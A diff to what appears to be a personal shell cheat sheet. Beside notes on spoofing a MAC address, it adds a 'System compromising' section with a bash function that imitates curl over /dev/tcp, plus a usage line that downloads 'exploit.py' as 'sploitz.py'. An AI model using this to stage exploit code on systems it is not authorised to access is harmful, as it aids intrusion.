@@ -30,4 +30,25 @@ sudo ifconfig {interface} hw ether {MAC address}
 sudo ifconfig {interface} up
 ```
 
-F4:A9:97:8B:29:DB
+## System compromising
+
+### curl or wget without the function itself
+```bash
+function __curl() {
+  read proto server path <<<$(echo ${1//// })
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+ 
+  exec 3<>/dev/tcp/${HOST}/$PORT
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  (while read line; do
+   [[ "$line" == $'\r' ]] && break
+  done && cat) <&3
+  exec 3>&-
+}
+ 
+ 
+# USAGE: __curl http://www.example.com/exploit.py > sploitz.py
+```
